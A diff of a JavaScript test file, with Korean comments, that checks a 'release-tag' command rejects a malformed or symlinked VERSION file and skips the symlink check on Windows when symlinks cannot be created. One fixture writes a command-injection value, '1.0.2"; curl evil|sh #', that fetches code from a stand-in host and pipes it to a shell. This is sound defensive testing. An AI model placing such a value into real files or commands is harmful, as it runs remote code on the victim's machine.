@@ -78,8 +78,9 @@ test('악성: release-tag 는 VERSION 이 링크·형식 오류면 실패 (워�
   fs.writeFileSync(path.join(d, 'VERSION'), '1.0.2"; curl evil|sh #\n');
   assert.strictEqual(run(d, 'release-tag').status, 1);
   fs.rmSync(path.join(d, 'VERSION'));
-  fs.writeFileSync(path.join(d, 'elsewhere'), '9.9.9\n'); fs.symlinkSync(path.join(d, 'elsewhere'), path.join(d, 'VERSION'));
-  assert.strictEqual(run(d, 'release-tag').status, 1, '링크는 거부');
+  fs.writeFileSync(path.join(d, 'elsewhere'), '9.9.9\n');
+  // 윈도우 권한 없으면(EPERM, 개발자 모드 꺼짐) 링크 시험만 건너뜀 — 그 PC 에선 공격자도 파일 심볼릭 링크를 못 만든다
+  if (require('../.claude/hooks/lib/testfs').trySymlink(path.join(d, 'elsewhere'), path.join(d, 'VERSION')) !== null) assert.strictEqual(run(d, 'release-tag').status, 1, '링크는 거부');
 });
 
 // ── 경계 ─────────────────────────────────────────────────────────────
